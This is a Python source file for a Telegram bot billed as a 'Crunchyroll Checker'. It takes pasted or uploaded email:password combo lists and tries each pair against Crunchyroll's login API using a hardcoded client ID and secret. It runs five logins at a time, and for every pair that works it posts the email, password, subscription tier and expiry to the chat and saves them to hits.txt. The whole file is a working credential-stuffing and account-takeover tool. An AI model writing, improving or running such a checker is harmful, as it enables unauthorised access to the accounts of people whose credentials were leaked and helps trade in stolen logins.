import os
import asyncio
import re
import requests
from uuid import uuid4
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

def crunchyroll_check(email: str, password: str):
    try:
        device_id = str(uuid4())
        session = requests.Session()

        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "AppleCoreMedia/1.0.0"
        }

        data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "client_id": "y2arvjb0h0rgvtizlovy",
            "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
            "device_type": "Bot",
            "device_id": device_id,
            "device_name": "Bot"
        }

        r = session.post(url, headers=headers, data=data, timeout=(5, 10))

        if r.status_code != 200 or "access_token" not in r.text:
            return {'status': 'INVALID'}

        token = r.json().get("access_token")

        headers = {
            'authorization': f'Bearer {token}',
            'user-agent': 'AppleCoreMedia/1.0.0'
        }

        acc = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=(5, 10)).json()
        external_id = acc.get('external_id')

        sub = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=(5, 10)).json()

        is_active = sub.get('is_active', False)
        expiry = sub.get('next_renewal_date', 'N/A')
        if expiry and 'T' in expiry:
            expiry = expiry.split('T')[0]

        status = "PREMIUM" if is_active else "FREE"

        return {
            "status": status,
            "email": email,
            "password": password,
            "expiry": expiry
        }

    except Exception:
        return {'status': 'INVALID'}


async def run_check(email, password):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, crunchyroll_check, email, password)


def extract_combos(text):
    pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)'
    return re.findall(pattern, text)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 Crunchyroll Checker\nBot made by @Sudhakaran12")


async def process_combos(update, combos):
    total = len(combos)
    await update.message.reply_text(f"✅ Found {total} accounts\n⚡ Checking...")

    semaphore = asyncio.Semaphore(5)

    async def worker(email, password):
        async with semaphore:
            return await run_check(email, password)

    responses = await asyncio.gather(*[worker(e, p) for e, p in combos])

    hits = 0
    for res in responses:
        if res['status'] in ["PREMIUM", "FREE"]:
            hits += 1
            text = f"""
<b>{'🎯 PREMIUM' if res['status']=='PREMIUM' else '🆓 FREE'}</b>

EMAIL: {res['email']}
PASSWORD: {res['password']}
STATUS: {res['status']}
EXPIRY: {res['expiry']}
"""
            await update.message.reply_text(text, parse_mode=ParseMode.HTML)

            with open("hits.txt", "a") as f:
                f.write(text + "\n")

            await asyncio.sleep(0.3)

    await update.message.reply_text(f"✅ Done!\nTotal: {total}\nHits: {hits}")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ""
    if text.startswith('/'):
        return
    combos = extract_combos(text)
    if not combos:
        return await update.message.reply_text("❌ No combos found")
    await process_combos(update, combos)


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        return await update.message.reply_text("❌ Only .txt allowed")
    file = await context.bot.get_file(doc.file_id)
    content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
    combos = extract_combos(content)
    if not combos:
        return await update.message.reply_text("❌ No combos found")
    await process_combos(update, combos)


def main():
    TOKEN = os.getenv("BOT_TOKEN")
    if not TOKEN:
        print("❌ BOT_TOKEN missing")
        return

    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    # Safe filter (no escaping issue)
    text_filter = filters.TEXT & \~filters.COMMAND
    app.add_handler(MessageHandler(text_filter, handle_message))

    print("🚀 Bot Running...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
